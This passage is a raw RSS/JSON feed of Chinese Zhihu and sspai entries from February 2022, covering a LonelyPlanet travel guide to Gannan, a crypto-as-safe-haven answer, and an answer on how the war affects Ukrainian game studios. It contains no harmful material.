src=\"https://pic2.zhimg.com/v2-980b889fb1816ffe5ac36eccddecb602_720w.jpg?rss\" data-caption=\"由苏子恒提供\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"615\" data-watermark=\"original\" data-original-src=\"v2-980b889fb1816ffe5ac36eccddecb602\" data-watermark-src=\"v2-a44873660fba80e5ba0aafc119f6d1e5\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"Hoksffue\">古城按<b>“空心十字形”</b>构筑城池，八个方向各筑有一个墩台，因而为八角城，藏文献称其为“卡尔雍仲城”，意即“卍”字城。</p>\n<p><br></p>\n<p data-pid=\"bMBt_EB6\"><b># 夏河到郎木寺 #</b></p>\n<p><br></p>\n<p data-pid=\"jDfEhlgW\">从夏河到郎木寺，这是一条大部分自助旅行者都会选择的路线，无论是人文景点还是自然景观都蕴藏经典，即便路边的草原风光也毫不逊色。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0cc29a461f196e1b3b964cebbf45783a_720w.jpg?rss\" data-caption=\"由林大柱Lindazhu提供\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1441\" data-watermark=\"original\" data-original-src=\"v2-0cc29a461f196e1b3b964cebbf45783a\" data-watermark-src=\"v2-005118a8360a69b77f90daab3bed4720\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"K5UuWsXA\">从夏河驱车一个小时即可到达甘南州府合作市，如果你自驾的话，只需花上半天时间，<b>S312省道</b>周边熊猫沟、达尔宗湖、德尔隆寺都可一并游览。</p>\n<p><br></p>\n<p data-pid=\"yjH-RD52\"><b>#尕海</b></p>\n<p data-pid=\"eBibz8a7\"><i>生机勃勃的“高原小珍珠”</i></p>\n<p data-pid=\"iX0KZplj\">“尕”就是小的意思，不过尕海却是甘南<b>第一大淡水湖</b>，也是青藏高原东部的一块重要湿地，被誉为<b>“高原小珍珠”</b>。每年春末夏初，成群的白天鹅、灰雁、斑头雁等近百种鸟类，从中国南方和东南亚飞来，在这个高原神湖安家、产蛋、育雏。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d6564a3f79d047c8bed68ebbc3a6797c_720w.jpg?rss\" data-caption=\"由JenniferPPPPPP提供\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"607\" data-watermark=\"original\" data-original-src=\"v2-d6564a3f79d047c8bed68ebbc3a6797c\" data-watermark-src=\"v2-3e99d42f21c001d8b658e9fb145471a9\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"U77c7S1b\">这里的草原平坦开阔，牲畜群在牧场上悠闲生活，夏天野花繁密、充满生机，入秋后就像一块金色的织锦覆在湖边。深蓝如镜的湖水与蓝天白云交相辉映，远处山峦起伏，近处<b>黑颈鹤</b>在湖边觅食戏水，时而有成群灰雁掠过眼前。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4b07d46070dfa4869c04829e4801f31d_720w.jpg?rss\" data-caption=\"由JenniferPPPPPP提供\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"607\" data-watermark=\"original\" data-original-src=\"v2-4b07d46070dfa4869c04829e4801f31d\" data-watermark-src=\"v2-7da517db3093147e9d3b670972f4967c\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"w6WRWm0a\"><b>#郎木寺</b></p>\n<p data-pid=\"JatVqeoa\"><i>闻名遐迩的“东方小瑞士”</i></p>\n<p data-pid=\"kyUQJZDe\">郎木寺并非单指一座寺院，而是一座位于川甘两省交界处的小镇，省界从西北向东南将小镇一分为二，各有一座藏传佛教寺院坐落其界。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2d8afc5ed7a8ea276137e6bad6e837af_720w.jpg?rss\" data-caption=\"©赵峰旅行摄影/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-2d8afc5ed7a8ea276137e6bad6e837af\" data-watermark-src=\"v2-8b164ecbab59eff098c88ea5c4f42792\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"UbswwknI\">在迷人的清晨和黄昏时分，薄雾和炊烟笼罩着山坳中的小镇，温暖的金黄色光泽铺满整片大地，站在山顶目睹这美丽景色的你一定会承认，<b>“东方小瑞士”</b>并非浪得虚名。</p>\n<p><br></p>\n<p data-pid=\"Zzc1ZxGG\"><b>达仓朗木格尔底寺</b></p>\n<p data-pid=\"l4o-DXBH\">又叫“郎木寺四川寺院”或<b>“格尔底寺”</b>，是阿坝最具影响力的格鲁派寺院之一，规模要比甘肃寺大，历史也更久，有四大学院和两所小学，另外辖有十八座分寺。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-271fd693f34787c8cf2d1c4c262ec2ed_720w.jpg?rss\" data-caption=\"©摄影师164204781957161/图虫创意\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-271fd693f34787c8cf2d1c4c262ec2ed\" data-watermark-src=\"v2-77347aa1541cf9495ebc3ad86169794b\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"MzNlWinS\">寺院的主体建筑群位于进大门后的右侧山坡上，除礼佛外，这些佛殿和学院<b>不对游客开放</b>。寺内许多山坡都可以俯瞰整座寺院，在寺内信步时你还能见到寺里饲养的梅花鹿。</p>\n<p><br></p>\n<p data-pid=\"eATh90G_\"><b>达仓郎木赛赤寺</b></p>\n<p data-pid=\"mOvMBT61\">达仓郎木赛赤寺位于郎木寺镇甘肃一侧，也叫<b>“赛赤寺”</b>或“甘肃寺”。达仓郎木寺是西藏哲蚌寺的子寺，属格鲁派，于1748年创建，创始人<b>坚赞桑盖</b>是出类拔萃的大学者。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0584ca7ede4da358334f2cb6c2780dfe_720w.jpg?rss\" data-caption=\"©beibaoke/deposit/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"original\" data-original-src=\"v2-0584ca7ede4da358334f2cb6c2780dfe\" data-watermark-src=\"v2-bbc00c8d1be54cff4df2e0a492b6be56\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"sXVo2I8x\"><b># 迭部及卓尼 #</b></p>\n<p><br></p>\n<p data-pid=\"A6vAxuu8\">这片地区闻名于世，要归功于奥地利裔美国植物学家<b>约瑟夫·洛克</b>。1925年，洛克在迭部、卓尼地区进行了为期两年的考察，相关的游记和照片大篇幅发表在1928年11月的美国《国家地理》杂志上，迭部、卓尼的美景因此而名扬世界。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7ad2d3cd01eb794f1a7dfd0347cb90ce_720w.jpg?rss\" data-caption=\"©A-shley/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"719\" data-watermark=\"original\" data-original-src=\"v2-7ad2d3cd01eb794f1a7dfd0347cb90ce\" data-watermark-src=\"v2-3066f148db4c93de4d35fc3a28fbae5b\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"PxGKYD5s\"><b>#扎尕那</b></p>\n<p data-pid=\"RN4_OBvB\"><i>隐世村庄，仙居之地</i></p>\n<p data-pid=\"JdtqWc8j\">被高耸山石包裹的扎尕那有着茂密苍翠的森林、广袤的青稞麦地、晨曦微明的寺院，洛克曾站在云缠雾绕的扎尕那说：“我平生未见过如此绚丽的景色。如果《创世纪》的作者曾看见迭部的美景，将会把亚当和夏娃的诞生地放在这里……”</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3c6927f9eb417f58d1d2ad912ea02890_720w.jpg?rss\" data-caption=\"©按快门的上善若水/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"original\" data-original-src=\"v2-3c6927f9eb417f58d1d2ad912ea02890\" data-watermark-src=\"v2-6221fbebb37a98a5704fb8e3fb9fe91a\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"VJawS6xA\">开发后的扎尕那主景区被叫作<b>“涅甘达娃神山公园”</b>。景区内有两条主线，一条步行线路至仙女滩和仙女湖，另一条是区间车线路，终点是扎尕那徒步穿越的起点。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ea5c1903447fa28461e84e2792b93340_720w.jpg?rss\" data-caption=\"©zest099/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"608\" data-watermark=\"original\" data-original-src=\"v2-ea5c1903447fa28461e84e2792b93340\" data-watermark-src=\"v2-6d5784c9cb077ebdc5c303e769cbf972\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"NY0bLlnF\">业日村有个挂满经幡的观景台，被称为<b>“洛克观景台”</b>，这里提供了另一个饱览扎尕那全景的好视角。扎尕那最上面的两个村庄<b>达日村</b>和<b>代巴村</b>不会比下面的村庄更原始，但肯定会更幽静，视角也更广。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4addc3d0cabba729e0bbd651ecf5bfb6_720w.jpg?rss\" data-caption=\"©杜海鸣/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"843\" data-watermark=\"original\" data-original-src=\"v2-4addc3d0cabba729e0bbd651ecf5bfb6\" data-watermark-src=\"v2-227a9d6d084b03abdea1768a3c041f1d\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"p6K6eq6U\"><b>· 徒步和越野 ·</b></p>\n<p data-pid=\"1hiiiZW6\">从扎尕那出发有数条徒步穿越路线，最短的是<b>扎尕那一日小环线</b>，途经一线天-石林-石城-大峡谷，回到仙女滩，当天走完强度较大，可以走到石林后折返。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-46438abeb022a44102e289322dd238cb_720w.jpg?rss\" data-caption=\"©方托马斯/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-46438abeb022a44102e289322dd238cb\" data-watermark-src=\"v2-61ce6a560f5598be5ad7246fb641b906\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"XhvQFAYL\">最热门的徒步路线是从<b>扎尕那</b>到卓尼大峪沟的<b>三角石</b>，全程62公里，需要3～4天，分正穿和反穿，你会很容易找到走此线路的向导和俱乐部。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-f9d7a5f3cea5facf49ebd5256d6a5895_720w.jpg?rss\" data-caption=\"©zest099/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"780\" data-watermark=\"original\" data-original-src=\"v2-f9d7a5f3cea5facf49ebd5256d6a5895\" data-watermark-src=\"v2-abe0f52eb7b76c5d816e08aefb5ac41a\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"rV9t_Kub\">从扎尕那北门到卓尼车巴沟，是一条翻越迭山的<b>经典越野路线</b>，被称为自驾版的“洛克之路”。另外，还有一条从冻列乡到扎尕那的<b>自行车越野线路</b>。</p>\n<p><br></p>\n<p data-pid=\"payk4N6A\"><b>#卓尼</b></p>\n<p data-pid=\"W9Sag-Rh\"><i>洛克眼中真正的香格里拉</i></p>\n<p data-pid=\"ObFhQCap\">卓尼有历史悠久的安多古刹<b>禅定寺</b>值得驻足探访。禅定寺创立于1254年，比拉卜楞寺的创立时间还要早400多年，数百年发展过程中，逐步成为安多藏区政治、宗教和文化中心之一。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4dc75a2d2355c18a982b014320b219dd_720w.jpg?rss\" data-caption=\"©赵峰旅行摄影/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-4dc75a2d2355c18a982b014320b219dd\" data-watermark-src=\"v2-552fefcbce23e63fbed8a132fb1f6546\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"DMVqvJZS\">在自然风光方面，卓尼遍布令人心动的原始峡谷和森林风光，同时还能体验到淳朴浓郁的藏民族风情，这里的<b>阿迦锅庄</b>与藏羌锅庄有所不同，动作舒展优雅，曲调更为徐缓。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-05424885614825a377072b36459b9687_720w.jpg?rss\" data-caption=\"©方托马斯/图虫创意\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-05424885614825a377072b36459b9687\" data-watermark-src=\"v2-de96ed45d233e7a5481cc4d03d393ffd\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"mghhgBdv\">这里的藏族服饰被称为<b>“觉乃”</b>，有很独特的明清贵族风范。卓尼还是中国三大名砚之一——洮砚的出产地，被誉为<b>“洮砚之乡”</b>。</p>\n<p><br></p>\n<p data-pid=\"AFEQ_1Ay\"><b>负责任的旅行 · 尊重当地风俗</b></p>\n<p data-pid=\"xahiW2gf\"><b>&gt;不要未经允许拍摄人像</b> 未经允许就拍摄是很不尊重他人的粗鲁举动，当地人对此非常反感。<br></p>\n<p data-pid=\"ZuJ6p2qm\"><b>&gt;参观寺庙要讲究礼仪</b>避免穿不庄重的衣物进入寺庙，进入佛殿需脱帽；不可用手指指向佛像（可用整只手尊敬地示意）；不要打扰正在念经的喇嘛和朝拜的信徒；请勿在禁止拍照的区域拍摄；玛尼堆、转经筒等需顺时针绕过或旋转（本教寺庙除外）；喇嘛的生活区域不对外开放，请不要闯入；有的庙宇，不允许一般人进入。</p>\n<p data-pid=\"XzOVhP_r\"><b>&gt;做个有礼貌的客人</b>不可脚踩门槛，就座时不可脚底朝向他人；接受他人递来的东西时要用双手接过，表示尊敬；藏族家里不便见客时，门前会做标记，有的会在门外生一堆火，或在门口插上树枝或贴一红布条，见此类标记切勿进入打扰。 </p>\n<p data-pid=\"PpqbhHMI\"><b>&gt;尊重当地民俗</b>不要未经家属允许旁观天葬，天葬现场绝对不能拍照；不可触碰别人的头顶或法器。</p>\n<p data-pid=\"N_l2wQpU\"><b>&gt;自驾礼仪</b>遇到牧民的牛羊，请耐心等待，实在遇到无法通过的情况才可鸣笛或用灯光驱赶。</p>\n<p><br></p>\n<p><br></p>\n<p data-pid=\"PrhxNRUN\"><b>你去过甘南吗？</b></p>\n<p data-pid=\"xv7NrmWi\"><b>有没有什么记忆犹新的特别经历？</b></p>\n<p data-pid=\"oggG6Pb1\"><b>快来评论区</b></p>\n<p data-pid=\"Wor9XaAe\"><b>和我们分享吧~</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f6090a5f9aaa77d3ffd9ea3bbd276a77_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"690\" data-watermark=\"original\" data-original-src=\"v2-f6090a5f9aaa77d3ffd9ea3bbd276a77\" data-watermark-src=\"v2-bfe3dcd076e279d65e4115a0c3b82a7b\" data-private-watermark-src=\"\" data-tags=\"porn\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-396906c2e59f13369405545b726e9782_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1102\" data-rawheight=\"318\" data-watermark=\"original\" data-original-src=\"v2-396906c2e59f13369405545b726e9782\" data-watermark-src=\"v2-4158ca18cc9c1a74f01699586bce94fb\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-888540463cbd7eac23c79fc9f7928e5e_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1102\" data-rawheight=\"844\" data-watermark=\"original\" data-original-src=\"v2-888540463cbd7eac23c79fc9f7928e5e\" data-watermark-src=\"v2-9c76d932c2a13e71470ea9206f65377a\" data-private-watermark-src=\"\" data-qrcode-action=\"none\" data-qrcode-value=\"http://weixin.qq.com/r/1kjz63TEJylYrTCI9x3E\" data-tags=\"qrcode\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/lonelyplanet-15?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">LonelyPlanet</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/482390844/answer/2367287358?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/422355194?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">11月去川西时间为3-4天自驾，有没有好的攻略？</a><br><a href=\"http://www.zhihu.com/question/470915982?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">川西旅行有哪些值得注意的地方？</a><br>\n","link":"http://www.zhihu.com/question/482390844/answer/2367287358?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"年度征文 | 节时提效，用飞书妙记提升学习体验","date":"2022-02-28 03:09:45","description":"本文的写作目的，正是分享一些飞书妙记在我的工作、会议场景之外的使用技巧，希望能够为拥有类似需求的朋友提供些许参考。<a href=\"https://sspai.com/post/70960\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/70960"},{"title":"派早报：Steam Deck 首批评测出炉；多平台就国际局势讨论提出倡议","date":"2022-02-28 00:59:19","description":"你可能错过的新鲜事SteamDeck首发评测出炉，优缺点鲜明2月25日，SteamDeck正式出货首批产品，而各个媒体也在第一时间进行了上手评测。评测中，媒体大多赞赏其持握感出色、性能出众、可以兼做L ...<a href=\"https://sspai.com/post/71725\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71725"},{"title":"了解这些小技巧，今晚开始努力睡个好觉","date":"2022-02-27 09:00:00","description":"不要在睡下的时刻开始因为失眠而苦恼，要知道修复睡眠是一个身心皆要修复的过程，还需要睡眠环境加以辅助，从现在就开始思考如何行动起来让睡眠更好吧！<a href=\"https://sspai.com/post/71679\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71679"},{"title":"俄乌冲突以来，为什么数字货币一直在跌，是否有避险属性，如何理解数字货币在金融市场的作用?","date":"2022-02-26 08:40:29","description":"\n<p data-pid=\"TMCN_mAb\">这个问题问的很好，关系到现在的市场到底是如何对比特币为首的数字货币定性的问题。首先避险只是一个说法，目前公认的避险资产是美元、日元、黄金，<b>什么时候见过价格像比特币这样波动如此剧烈的「避险资产」了？</b></p>\n<p data-pid=\"POv4ZFei\">比特币和黄金的关系，在最近这一年逐渐的明晰，非常的有趣。</p>\n<p data-pid=\"K1Kn-4Fd\">在经济向好，宽松的时候，作为传统意义上抗通胀的的资产，黄金应该水涨船高。然而事实上是比特币抢走很多黄金的涨幅。<b>因为宽松的时候大量的热钱流入币市，数字货币的盘子又小又缺少严格的监管，所以数字货币带来的收益比黄金更加可观</b>。</p>\n<p data-pid=\"gAc5Gytt\">在美联储进入缩表周期，要升息对抗通胀之后。纳斯达克和比特币是一起往下跌的。这说明投资人意识到了货币紧缩的风险，之前的获利急于套现变成美元，故而美元走上上升通道。</p>\n<p data-pid=\"rOLg4eWA\">在货币宽松/紧缩这个应对上，比特币和黄金的市场逻辑是一致的，因为彼此的性质确实很相似，都是数量有限的无息资产。一般来说，比特币收益率更高。<b>在货币宽松时代，投资人对风险的容忍度更高，所以比特币在这段期间确实能体现出「避险资产」的一些特点</b>，压倒黄金走上上升通道。</p>\n<p data-pid=\"gFNhRXUp\">但是这其实不是避险资产，而是在投资人普遍偏好风险的情况下的「避险」，不符合传统意义上避险的定义，这一点在这次乌东危机中就体现出来了。</p>\n<p data-pid=\"y9cyyyPY\">乌东危机的问题上，这个风险并非是单纯货币向通胀，而是区域冲突。里面蕴含着很多的风险和不确定性：</p>\n<ul>\n<li data-pid=\"40cstJNf\">有些国家和地区的生意和正常的商业往来必然受到影响；</li>\n<li data-pid=\"raLAh_4m\">有些国家和地区可能需要发行债券来增加军费；</li>\n<li data-pid=\"eISpeMEC\">有些国家和地区可能需要用宽松的货币政策；</li>\n<li data-pid=\"bMolwtNF\">有些国家和地区的主权货币的信用可能会下降；</li>\n</ul>\n<p data-pid=\"UYAJD5jU\">……</p>\n<p data-pid=\"TpI3fYd_\">等等等等。这种风险是更加深层次的，会<b>导致投资人整体对风险的容忍度下降</b>。在下降不显著的时候，比如乌东危机逐渐发酵之际，我们尚且能观察到比特币和黄金同涨——其实这中间有多少是真的在用比特币避险，有多少是资金试图逃离也很难说。</p>\n<p data-pid=\"9SMUE1kD\">而真的打起来之后，投资人变得更加保守，风险容忍度(risk tolerance)大幅度下降，比特币高波动和脆弱的信念支撑就暴露了，黄金和比特币就走上了相反的路径，作为老牌的避险资产的黄金上涨，而比特币和纳斯达克同跌。</p>\n<p data-pid=\"WC_zajvG\">这种现象我倾向于认为是暂时的。因为纳斯达克下跌的逻辑是很显然的，地区冲突增加了对未来收益的悲观预期，所以高成长的股票有下跌的倾向；但是比特币是总数有限，不产生任何利息收益的大宗商品，性质上更接近于原油、黄金，而非纳斯达克指数。</p>\n<p data-pid=\"KsHWW06T\">目前没有达到这一步，还是因为市场上的投机太多，而没有太多人对数字货币有类似黄金、原油一样的信念支撑。从趋势上看，比特币最近这十来年，波动有逐渐变缓慢的趋势，可能再过十年、二十年，数字货币和去中心化的金融能够普及了，比特币价格波动下降到近似于黄金的量级，那么比特币可能会成区域冲突中的「避险资产」。</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/divinites?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">司马懿</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/518461362/answer/2364494644?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">185 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/358856185?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你觉得2020年12月25日比特币价格会到多少美元？</a><br><a href=\"http://www.zhihu.com/question/306866222?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你觉得2019年12月25日比特币价格会到多少美元？</a><br>\n","link":"http://www.zhihu.com/question/518461362/answer/2364494644?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"目前乌克兰局势动荡，乌克兰国内和附近国家（比如波兰）游戏公司们会受到影响吗？","date":"2022-02-25 10:01:15","description":"\n<h3>前言</h3>\n<p data-pid=\"9vfjloYu\">俄罗斯国内的游戏厂商自不用说，而坦克世界开发商Wargaming在白俄罗斯，这个国家和俄罗斯关系非常好，目前很安全，游戏正常更新维护。</p>\n<p data-pid=\"8ZCbAoV_\">至于波兰，虽然是北约国家，但俄罗斯目前的战略目标仅限于乌克兰，波兰受到波及的可能性很小。</p>\n<p data-pid=\"46eDjHlb\">值得一提的是，11bit这位波兰游戏厂商正在为乌克兰红十字会募捐。很值得赞赏。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e4e70386370ec469028adcc84cb39e7a_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"1024\" data-size=\"normal\" data-watermark=\"original\" data-original-src=\"v2-e4e70386370ec469028adcc84cb39e7a\" data-watermark-src=\"v2-f838486ed97540436e12ba24c469793c\" data-private-watermark-src=\"v2-49dcbc7cd6bb347f2b04f677acea2cf8\"></p>\n<h3>那些陷入战火的乌克兰游戏厂商</h3>\n<p data-pid=\"jIYX0a7K\"><b>1、地铁系列开发商4A Games。</b></p>\n<p data-pid=\"tPlXT0ob\">虽然是在基辅创立的，但它原来的总部在乌克兰东部地区顿涅茨克州的顿巴斯(对，就是俄罗斯宣布承认独立的东乌克兰两个共和国之一)，就是因为这几年乌克兰东部局势动荡，政府军和民间武装一直在交火，才去了马耳他。就现在乌克兰的情况，还不知道什么时候能回来。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ff0b606f54f5cbdea1fdbd007464469e_720w.jpg?rss\" data-rawwidth=\"640\" data-rawheight=\"395\" data-size=\"normal\" data-watermark=\"original\" data-original-src=\"v2-ff0b606f54f5cbdea1fdbd007464469e\" data-watermark-src=\"v2-e3b70556bde3cd7cdc0663462503deb6\" data-private-watermark-src=\"v2-b5a0a861b152e84aa1707c7cb7a687bb\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-aa981b7aabd3abdfd2f34a774ff829b7_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"地铁:离乡\" data-watermark=\"original\" data-original-src=\"v2-aa981b7aabd3abdfd2f34a774ff829b7\" data-watermark-src=\"v2-184ba94857436776267db7e483788ccb\" data-private-watermark-src=\"v2-a05ec55912898577eb61f68d8c5d7749\"></p>\n<p data-pid=\"1zHxoRL5\"><b>目前状况:</b></p>\n<p data-pid=\"4zQoeq4A\"><b>·</b>相对安全，游戏正在积极开发。</p>\n<p data-pid=\"J3WR1Fur\">·眼下回国不可能。</p>\n<p data-pid=\"jx8WiqPk\">·刚刚公布了一段支持乌克兰的新声明。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ec55d2885fcd495b97e5b4d9d284485c_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"original\" data-original-src=\"v2-ec55d2885fcd495b97e5b4d9d284485c\" data-watermark-src=\"v2-6b07d23f3fb101e8e0ec931820877772\" data-private-watermark-src=\"v2-97c4d443edec3cfe969033d9f468f61e\"></p>\n<p data-pid=\"BhKg4PJt\"><b>2、潜行者系列的开发商GSC Game World</b></p>\n<p data-pid=\"x3wp-K2U\">作为4A Games的老东家，GSC的状况更惨，它的总部就在乌克兰首都基辅，这段时间一直被俄军的火力覆盖。城内状况一团糟。目前俄军已经开始攻城，巷战战况非常激烈。所以我觉得潜行者2今年年内都有可能无法完成制作。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-16a3b3d6f3dcaea4a6c1fb5aed9a8e74_720w.jpg?rss\" data-rawwidth=\"200\" data-rawheight=\"133\" data-size=\"normal\" data-watermark=\"original\" data-original-src=\"v2-16a3b3d6f3dcaea4a6c1fb5aed9a8e74\" data-watermark-src=\"v2-1d006cd5da9cc00835eafbba1a65c41e\" data-private-watermark-src=\"v2-29f336bbd061d70eeab06edf950068e8\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c432ecfcf2049a68c3e08b0d1eda667e_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"潜行者2:切尔诺贝利之心\" data-watermark=\"original\" data-original-src=\"v2-c432ecfcf2049a68c3e08b0d1eda667e\" data-watermark-src=\"v2-b4f52c861e5d473fbad649c2bd6d5fa0\" data-private-watermark-src=\"v2-ca5ae23be27f78745f3c7752e951a098\"></p>\n<p data-pid=\"G2x4e_q7\"><b>目前状况:</b></p>\n<p data-pid=\"6EdI0YUt\">·形势堪忧，游戏开发目前处于中断状态。</p>\n<p data-pid=\"MKVZJGdd\">·Steam社区的玩家们正在呼吁GSC赶紧离开乌克兰。</p>\n<p data-pid=\"ISz3BSqj\">·GSC正在为乌克兰军队募捐，试图保卫乌克兰。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-9430ee499c3d9b18d6d3456f617cf4cd_720w.jpg?rss\" data-rawwidth=\"677\" data-rawheight=\"842\" data-size=\"normal\" data-watermark=\"original\" data-original-src=\"v2-9430ee499c3d9b18d6d3456f617cf4cd\" data-watermark-src=\"v2-d0d55c9005bf7de18691e3906dc2a226\" data-private-watermark-src=\"v2-92dc7d59fe075ce4a55c9616f8a0e03c\"></p>\n<p data-pid=\"TziaNRP7\"><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-19571838f4a67ef3f0646f81685745a4_720w.jpg?rss\" data-rawwidth=\"598\" data-rawheight=\"1135\" data-size=\"normal\" data-watermark=\"original\" data-original-src=\"v2-19571838f4a67ef3f0646f81685745a4\" data-watermark-src=\"v2-5473d98d43f97ec34844e2ab9161084b\" data-private-watermark-src=\"v2-b848435bf5a041aecd898807c79b798b\"></p>\n<p data-pid=\"TziaNRP7\"><b>3、Frogwares</b></p>\n<p data-pid=\"ZKMftCp1\">作为推理游戏爱好者圣地，福尔摩斯系列游戏的开发商，以及刚发售了《夏洛克·福尔摩斯:第一章》的厂商，它的总部也是在乌克兰首都基辅。虽然在都柏林有工作室，但主力开发团队还是在乌克兰。</p>\n<p data-pid=\"S3rkyotA\">所以……可能夏洛克·福尔摩斯:第一章的季票，要难产了。毕竟战争是无情的。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-90a663f1f308b0b01f4a5c886f6c9575_720w.jpg?rss\" data-rawwidth=\"200\" data-rawheight=\"133\" data-size=\"normal\" data-watermark=\"original\" data-original-src=\"v2-90a663f1f308b0b01f4a5c886f6c9575\" data-watermark-src=\"v2-5be86d9c50a7a31577368ed5db40853d\" data-private-watermark-src=\"v2-2c96e3ec236d34f889c81ee685fbb066\" data-tags=\"porn\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-eca56fec4714217e96f879e964182206_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"夏洛克·福尔摩斯:第一章\" data-watermark=\"original\" 